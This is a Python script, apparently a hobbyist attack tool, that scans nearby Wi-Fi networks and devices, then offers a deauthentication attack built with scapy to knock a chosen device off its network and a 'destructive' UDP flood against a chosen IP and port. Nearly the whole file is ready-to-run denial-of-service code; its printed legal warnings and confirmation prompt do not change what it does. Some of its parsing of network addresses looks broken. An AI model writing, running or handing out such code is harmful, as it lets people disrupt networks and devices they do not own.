import os
import time
import platform
import subprocess
import random
import socket
from colorama import Fore, Style
from scapy.all import Dot11, Dot11Deauth, RadioTap, sendp, conf
from scapy.arch import get_if_list

# Color and style definitions
INFO = Fore.BLUE + Style.BRIGHT
WARNING = Fore.YELLOW + Style.BRIGHT
ERROR = Fore.RED + Style.BRIGHT
INPUT = Fore.CYAN + Style.BRIGHT
RESET = Style.RESET_ALL
GREEN = Fore.GREEN
BLUE = Fore.BLUE
RED = Fore.RED
BOLD = Style.BRIGHT

# Global variables
networks = None
devices = None
interface = None

# Clear screen function
def clear_screen():
    os.system("cls" if platform.system() == "Windows" else "clear")

# Display Wi-Fi banner
def display_banner():
    banner = f"""{RED}

     ██╗    ██╗██╗███████╗██╗         ██╗███╗   ███╗███████╗
     ██║    ██║██║██╔════╝██║         ██║████╗ ████║╚══███╔╝
     ██║ █╗ ██║██║█████╗  ██║         ██║██╔████╔██║  ███╔╝ 
     ██║███╗██║██║██╔══╝  ██║    ██   ██║██║╚██╔╝██║ ███╔╝  
     ╚███╔███╔╝██║██║     ██║    ╚█████╔╝██║ ╚═╝ ██║███████╗
      ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝     ╚════╝ ╚═╝     ╚═╝╚══════╝
                                                       

    {RESET}"""
    print(banner)

# Retrieve available wireless interfaces (Windows-focused)
def get_wireless_interfaces():
    """Retrieve a list of available wireless interfaces."""
    system = platform.system()
    if system == "Windows":
        try:
            # Use netsh to list wireless interfaces on Windows
            result = subprocess.run(["netsh", "wlan", "show", "interfaces"], capture_output=True, text=True)
            interfaces = []
            for line in result.stdout.splitlines():
                if "Name" in line:
                    interface_name = line.split(":")[1].strip()
                    interfaces.append(interface_name)
            return interfaces
        except Exception as e:
            print(f"{ERROR}Error retrieving wireless interfaces: {e}{RESET}")
            return []
    else:
        # Use Scapy for Linux/macOS
        interfaces = get_if_list()  # Get all network interfaces
        # Filter for wireless interfaces
        wireless_interfaces = [iface for iface in interfaces if iface.startswith(('wlan', 'wlp', 'wlo', 'wifi'))]
        return wireless_interfaces

# Automatically select the first wireless interface
def select_wireless_interface():
    """Automatically select the first available wireless interface."""
    global interface
    wireless_interfaces = get_wireless_interfaces()
    if not wireless_interfaces:
        print(f"{ERROR}No wireless interfaces found.{RESET}")
        print(f"{INFO}Please enter your wireless interface manually.{RESET}")
        interface = input(f"{INPUT}Enter your wireless interface (e.g., Wi-Fi):{RESET} ").strip()
        if interface:
            print(f"{INFO}Manually selected interface: {interface}{RESET}")
            return interface
        else:
            print(f"{ERROR}No interface provided.{RESET}")
            return None

    # Select the first interface
    interface = wireless_interfaces[0]
    print(f"{INFO}Automatically selected interface: {interface}{RESET}")
    return interface

# Scan Wi-Fi networks (Windows-focused)
def scan_wifi_networks():
    """Scan for nearby Wi-Fi networks."""
    print(f"\n{INFO}Scanning for nearby Wi-Fi networks...{RESET}")
    try:
        if platform.system() == "Windows":
            # Use netsh to list wireless networks and BSSIDs
            result = subprocess.run(["netsh", "wlan", "show", "networks", "mode=bssid"], capture_output=True, text=True)
            networks = []
            current_ssid = None
            for line in result.stdout.splitlines():
                if "SSID" in line and "BSSID" not in line:  # Extract SSID
                    current_ssid = line.split(":")[1].strip()
                elif "BSSID" in line:  # Extract BSSID
                    bssid = line.split(":")[1].strip()
                    networks.append({"ssid": current_ssid, "bssid": bssid, "signal": "N/A"})
        else:
            # Use nmcli for Linux/macOS
            result = subprocess.run(["nmcli", "-t", "-f", "SSID,BSSID,SIGNAL", "dev", "wifi"], capture_output=True, text=True)
            networks = []
            for line in result.stdout.splitlines():
                ssid, bssid, signal = line.split(":")
                networks.append({"ssid": ssid, "bssid": bssid, "signal": signal})

        if not networks:
            print(f"{ERROR}No Wi-Fi networks found.{RESET}")
            return None

        print(f"\n{GREEN}Found {len(networks)} Wi-Fi networks:{RESET}")
        for i, network in enumerate(networks, start=1):
            print(f"{i}. {network['ssid']} (BSSID: {network['bssid']}, Signal: {network['signal']} dBm)")
        return networks
    except Exception as e:
        print(f"{ERROR}Error scanning Wi-Fi networks: {e}{RESET}")
        return None

# Scan for connected devices on the target network (Windows-focused)
def scan_connected_devices(target_ip, interface):
    """Scan for connected devices on the target network using ARP."""
    print(f"\n{INFO}Scanning for connected devices on {target_ip}...{RESET}")
    try:
        # Use arp -a to list devices on the network
        result = subprocess.run(["arp", "-a"], capture_output=True, text=True)
        devices = []
        for line in result.stdout.splitlines():
            if "dynamic" in line.lower():  # Filter for dynamic entries
                parts = line.split()
                ip = parts[0]
                mac = parts[1]
                devices.append({"ip": ip, "mac": mac})

        if not devices:
            print(f"{ERROR}No devices found.{RESET}")
            return None

        print(f"\n{GREEN}Found {len(devices)} devices:{RESET}")
        for i, device in enumerate(devices, start=1):
            print(f"{i}. IP: {device['ip']} | MAC: {device['mac']}")
        return devices
    except Exception as e:
        print(f"{ERROR}Error scanning devices: {e}{RESET}")
        return None

# Select a Wi-Fi network
def select_wifi_network(networks):
    """Prompt the user to select a Wi-Fi network."""
    while True:
        try:
            choice = int(input(f"\n{INPUT}Select a network (1-{len(networks)}):{RESET} "))
            if 1 <= choice <= len(networks):
                selected_network = networks[choice - 1]
                if selected_network['bssid'] == "N/A":
                    print(f"{WARNING}BSSID not found for this network.{RESET}")
                    selected_network['bssid'] = input(f"{INPUT}Enter the BSSID manually (e.g., AA:BB:CC:DD:EE:FF):{RESET} ").strip()
                return selected_network
            else:
                print(f"{ERROR}Invalid choice. Please try again.{RESET}")
        except ValueError:
            print(f"{ERROR}Invalid input. Please enter a number.{RESET}")

# Select a connected device
def select_device(devices):
    """Prompt the user to select a connected device."""
    while True:
        try:
            choice = int(input(f"\n{INPUT}Select a device (1-{len(devices)}):{RESET} "))
            if 1 <= choice <= len(devices):
                return devices[choice - 1]
            else:
                print(f"{ERROR}Invalid choice. Please try again.{RESET}")
        except ValueError:
            print(f"{ERROR}Invalid input. Please enter a number.{RESET}")

# Send deauthentication packets to disconnect devices
def send_deauth(target_bssid, target_mac, interface, duration, packet_size):
    """Send deauthentication packets to disconnect devices from the target Wi-Fi network."""
    print(f"\n{RED}Starting Deauth Attack on {target_mac} for {duration} seconds...{RESET}")
    print(f"{WARNING}Press Ctrl+C to stop the attack.{RESET}")

    # Convert MAC address to scapy-compatible format (replace '-' with ':')
    target_mac = target_mac.replace("-", ":")
    target_bssid = target_bssid.replace("-", ":")

    # Validate BSSID format
    if not all(len(part) == 2 for part in target_bssid.split(":")):
        print(f"{ERROR}Invalid BSSID format. Please use the format XX:XX:XX:XX:XX:XX.{RESET}")
        return

    start_time = time.time()
    end_time = start_time + duration

    # Craft deauthentication packet
    deauth_packet = RadioTap() / Dot11(addr1=target_mac, addr2=target_bssid, addr3=target_bssid) / Dot11Deauth()

    # Adjust packet size (add padding)
    padding = b"\x00" * (packet_size - len(deauth_packet))
    deauth_packet = deauth_packet / padding

    sent = 0
    while time.time() < end_time:
        try:
            sendp(deauth_packet, iface=interface, verbose=False)
            sent += 1
            if sent % 100 == 0:  # Update progress less frequently to increase speed
                elapsed = time.time() - start_time
                print(f"[Deauth] Packets sent: {sent} | {sent/elapsed:.2f} packets/sec", end="\r")
        except KeyboardInterrupt:
            print(f"\n{RED}Attack interrupted by user.{RESET}")
            break
        except Exception as e:
            print(f"\n{RED}Error: {e}{RESET}")
            break

    print(f"\n{GREEN}Deauth Attack completed.{RESET}")
    print(f"Total deauth packets sent: {sent}")

# Send destructive UDP packets to the target
def send_destructive_udp(target_ip, port, duration, packet_size):
    """Send destructive UDP packets to the target."""
    print(f"\n{RED}Starting UDP Flood on {target_ip}:{port} for {duration} seconds...{RESET}")
    print(f"{WARNING}Press Ctrl+C to stop the attack.{RESET}")

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)  # Enable broadcast
    bytes_to_send = random._urandom(packet_size)  # Random bytes for the packet

    sent = 0
    start_time = time.time()
    end_time = start_time + duration

    while time.time() < end_time:
        try:
            sock.sendto(bytes_to_send, (target_ip, port))
            sent += 1
            if sent % 500 == 0:  # Update progress less frequently to increase speed
                elapsed = time.time() - start_time
                print(f"[UDP] Packets sent: {sent} | {sent/elapsed:.2f} packets/sec", end="\r")
        except KeyboardInterrupt:
            print(f"\n{RED}Attack interrupted by user.{RESET}")
            break
        except Exception as e:
            print(f"\n{RED}Error: {e}{RESET}")
            break

    sock.close()
    print(f"\n{GREEN}UDP Flood completed.{RESET}")
    print(f"Total UDP packets sent: {sent}")

# Main menu
def main_menu():
    global networks, devices, interface
    while True:
        clear_screen()
        display_banner()
        print(f"{BOLD}TOOL MADE BY MV${RESET}\n")

        print("1. Scan Wi-Fi Networks")
        print("2. Scan Connected Devices")
        print("3. Deauth Attack (Disconnect Devices)")
        print("4. Destructive UDP Flood")
        print("5. Exit")

        choice = input(f"\n{BOLD}Select an option:{RESET} ")

        if choice == "1":
            networks = scan_wifi_networks()
            if networks:
                input("\nPress Enter to continue...")
        elif choice == "2":
            if not networks:
                print(f"{ERROR}You must scan Wi-Fi networks first!{RESET}")
                time.sleep(2)
                continue

            selected_network = select_wifi_network(networks)
            print(f"\n{GREEN}Selected network: {selected_network['ssid']} (BSSID: {selected_network['bssid']}){RESET}")

            # Automatically detect and select wireless interface
            interface = select_wireless_interface()
            if not interface:
                time.sleep(2)
                continue

            # Scan for connected devices
            devices = scan_connected_devices(selected_network['bssid'], interface)
            if devices:
                input("\nPress Enter to continue...")
        elif choice == "3":
            if not devices:
                print(f"{ERROR}You must scan connected devices first!{RESET}")
                time.sleep(2)
                continue

            selected_device = select_device(devices)
            print(f"\n{GREEN}Selected device: IP: {selected_device['ip']} | MAC: {selected_device['mac']}{RESET}")

            # Ensure interface is selected
            if not interface:
                print(f"{ERROR}No interface selected. Please select an interface first.{RESET}")
                interface = select_wireless_interface()
                if not interface:
                    time.sleep(2)
                    continue

            # Get duration (default to 60 seconds)
            duration_input = input(f"\n{BLUE}Enter duration in seconds (default: 60):{RESET} ").strip()
            duration = int(duration_input) if duration_input else 60  # Default to 60 if blank
            if duration < 10 or duration > 300:
                print(f"{RED}Invalid duration! Using default (60 seconds).{RESET}")
                duration = 60

            # Get packet size (default to 64 bytes)
            packet_size_input = input(f"\n{BLUE}Enter packet size in bytes (default: 64  (1 is the best btw)) :{RESET} ").strip()
            packet_size = int(packet_size_input) if packet_size_input else 64  # Default to 64 if blank
            if packet_size < 1:
                print(f"{RED}Invalid packet size! Using default (64 bytes).{RESET}")
                packet_size = 64

            # Final confirmation
            print(f"\n{RED}{BOLD}FINAL WARNING:{RESET}")
            print(f"You are about to disconnect {selected_device['mac']} from the network")
            print(f"Duration: {duration} seconds | Packet size: {packet_size} bytes")
            print(f"\n{BOLD}THIS SHOULD ONLY BE DONE ON NETWORKS YOU OWN OR HAVE PERMISSION TO TEST.{RESET}")
            print(f"{BOLD}UNAUTHORIZED USE IS ILLEGAL AND CAN RESULT IN CRIMINAL CHARGES.{RESET}")

            confirm = input(f"\n{RED}Type 'CONFIRM' to proceed:{RESET} ")

            if confirm == "CONFIRM":
                send_deauth(selected_network['bssid'], selected_device['mac'], interface, duration, packet_size)
                input("\nPress Enter to continue...")
            else:
                print(f"{GREEN}Operation cancelled.{RESET}")
                time.sleep(1)
        elif choice == "4":
            if not devices:
                print(f"{ERROR}You must scan connected devices first!{RESET}")
                time.sleep(2)
                continue

            selected_device = select_device(devices)
            print(f"\n{GREEN}Selected device: IP: {selected_device['ip']} | MAC: {selected_device['mac']}{RESET}")

            # Get target port (default to 80)
            port_input = input(f"\n{BLUE}Enter target port (default: 80):{RESET} ").strip()
            port = int(port_input) if port_input else 80  # Default to 80 if blank
            if port < 1 or port > 65535:
                print(f"{RED}Invalid port! Using default port 80.{RESET}")
                port = 80

            # Get duration (default to 60 seconds)
            duration_input = input(f"\n{BLUE}Enter duration in seconds (default: 60):{RESET} ").strip()
            duration = int(duration_input) if duration_input else 60  # Default to 60 if blank
            if duration < 10 or duration > 300:
                print(f"{RED}Invalid duration! Using default (60 seconds).{RESET}")
                duration = 60

            # Get packet size (default to 1024 bytes)
            packet_size_input = input(f"\n{BLUE}Enter packet size in bytes (default: 1024):{RESET} ").strip()
            packet_size = int(packet_size_input) if packet_size_input else 1024  # Default to 1024 if blank
            if packet_size < 1:
                print(f"{RED}Invalid packet size! Using default (1024 bytes).{RESET}")
                packet_size = 1024

            # Final confirmation
            print(f"\n{RED}{BOLD}FINAL WARNING:{RESET}")
            print(f"You are about to send destructive UDP packets to {selected_device['ip']}:{port}")
            print(f"Duration: {duration} seconds | Packet size: {packet_size} bytes")
            print(f"\n{BOLD}THIS SHOULD ONLY BE DONE ON NETWORKS YOU OWN OR HAVE PERMISSION TO TEST.{RESET}")
            print(f"{BOLD}UNAUTHORIZED USE IS ILLEGAL AND CAN RESULT IN CRIMINAL CHARGES.{RESET}")

            confirm = input(f"\n{RED}Type 'CONFIRM' to proceed:{RESET} ")

            if confirm == "CONFIRM":
                send_destructive_udp(selected_device['ip'], port, duration, packet_size)
                input("\nPress Enter to continue...")
            else:
                print(f"{GREEN}Operation cancelled.{RESET}")
                time.sleep(1)
        elif choice == "5":
            print(f"\n{GREEN}Exiting...{RESET}")
            break
        else:
            print(f"{RED}Invalid choice!{RESET}")
            time.sleep(1)

# Run the main menu
if __name__ == "__main__":
    main_menu()
